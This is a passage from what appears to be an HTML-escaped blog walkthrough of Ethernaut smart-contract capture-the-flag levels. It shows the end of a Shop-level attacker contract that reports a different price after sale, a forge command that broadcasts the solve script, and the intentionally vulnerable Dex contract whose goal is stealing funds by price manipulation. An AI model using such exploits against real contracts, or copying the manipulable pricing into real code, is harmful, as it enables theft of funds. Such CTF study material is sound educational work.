&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if&lt;&#x2F;span&gt;&lt;span&gt;(shop&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;isSold&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;false&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;To run script :&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; source .env
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;$&lt;&#x2F;span&gt;&lt;span&gt; forge script script&#x2F;ShopSolve.s.sol:ShopSolve&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --rpc-url &lt;&#x2F;span&gt;&lt;span&gt;$RPC_URL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt; --broadcast
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;22-dex&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#22-dex&quot; aria-label=&quot;Anchor link for: 22-dex&quot;&gt;22 Dex&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;p&gt;&lt;code&gt;Dex.sol&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;javascript&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-javascript &quot;&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&#x2F;&#x2F; SPDX-License-Identifier: MIT
&lt;&#x2F;span&gt;&lt;span&gt;pragma solidity &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0.8&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;IERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;openzeppelin-contracts&#x2F;contracts&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;openzeppelin-contracts&#x2F;contracts&#x2F;access&#x2F;Ownable.sol&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract Dex is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Ownable&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0x00&lt;&#x2F;span&gt;&lt;span&gt;)) {
&lt;&#x2F;span&gt;&lt;span&gt;  address public token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  address public token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;() {}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;setTokens&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address _token2&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_token1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;_token2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;addLiquidity&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address token_address&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public onlyOwner &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token_address)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;  
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;swap&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;((from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;token1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;token2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;|| &lt;&#x2F;span&gt;&lt;span&gt;(from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;token2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Invalid tokens&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt;= &lt;&#x2F;span&gt;&lt;span&gt;amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Not enough to swap&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    uint swapAmount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getSwapPrice&lt;&#x2F;span&gt;&lt;span&gt;(from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;swapAmount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;transferFrom&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;swapAmount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;getSwapPrice&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address from&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address to&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return&lt;&#x2F;span&gt;&lt;span&gt;((amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(to)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(from)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;address&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;this&lt;&#x2F;span&gt;&lt;span&gt;)))&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SwappableToken&lt;&#x2F;span&gt;&lt;span&gt;(token1)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SwappableToken&lt;&#x2F;span&gt;&lt;span&gt;(token2)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address account&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public view returns &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint&lt;&#x2F;span&gt;&lt;span&gt;){
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;IERC20&lt;&#x2F;span&gt;&lt;span&gt;(token)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;balanceOf&lt;&#x2F;span&gt;&lt;span&gt;(account)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;contract SwappableToken is ERC20 {
&lt;&#x2F;span&gt;&lt;span&gt;  address private _dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;constructor&lt;&#x2F;span&gt;&lt;span&gt;(address dexInstance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;string memory symbol&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;uint256 initialSupply) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ERC20&lt;&#x2F;span&gt;&lt;span&gt;(name&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;symbol) {
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_mint&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;initialSupply)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;        _dex &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;dexInstance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;function &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;approve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;address spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;uint256 amount&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;public &lt;&#x2F;span&gt;&lt;span&gt;{
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;require&lt;&#x2F;span&gt;&lt;span&gt;(owner &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;_dex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;InvalidApprover&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;super&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_approve&lt;&#x2F;span&gt;&lt;span&gt;(owner&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;spender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amount)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;;
&lt;&#x2F;span&gt;&lt;span&gt;  }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;ul&gt;
&lt;li&gt;Goal&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;ol&gt;
&lt;li&gt;The goal of this level is for you to hack the basic DEX contract and steal the funds by price manipulation.&lt;&#x2F;li&gt;
